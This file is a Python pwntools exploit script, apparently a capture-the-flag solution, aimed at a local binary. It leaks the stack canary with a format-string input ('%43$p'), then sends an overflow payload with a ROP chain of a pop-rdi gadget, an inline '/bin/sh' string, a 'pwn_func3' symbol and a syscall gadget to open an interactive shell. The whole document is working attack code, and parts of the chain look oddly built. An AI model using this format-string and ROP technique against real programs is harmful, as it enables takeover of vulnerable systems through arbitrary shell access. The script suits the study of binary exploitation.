#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import sys 
import re

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or sys.argv[1])
rop = ROP(exe)
libc = exe.libc

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())


io = start()

#================= Leak Canary ==================================
io.sendline(b"PRINTS")
io.sendline(b"%43$p")
io.sendline(b"EXEC")
canary = int(io.recvline_regex(b"0x[0-9a-f]+"), 16)
print(f"Canary: {hex(canary)}")

#================= ROP Configuration ==================================
pwn_func3 = exe.symbols['pwn_func3']
print(f"pwn_func3: {hex(pwn_func3)}")
POP_RDI = rop.rdi.address
print(f"POP_RDI: {hex(POP_RDI)}")
SYSCALL = rop.find_gadget(["syscall"])[0]
print(f"SYSCALL: {hex(SYSCALL)}")

#================= Payload Construction ==================================
payload = b"".join([
    b"prints ",
    p64(canary) * 34,
    b"\0" * 8,
    p64(POP_RDI),
    b"/bin/sh\x00",
    p64(pwn_func3),
    p64(SYSCALL)
])

io.sendlineafter(b'Enter command: ', payload)
io.sendlineafter(b'Enter command: ', b'exec')
io.interactive()
io.close() 
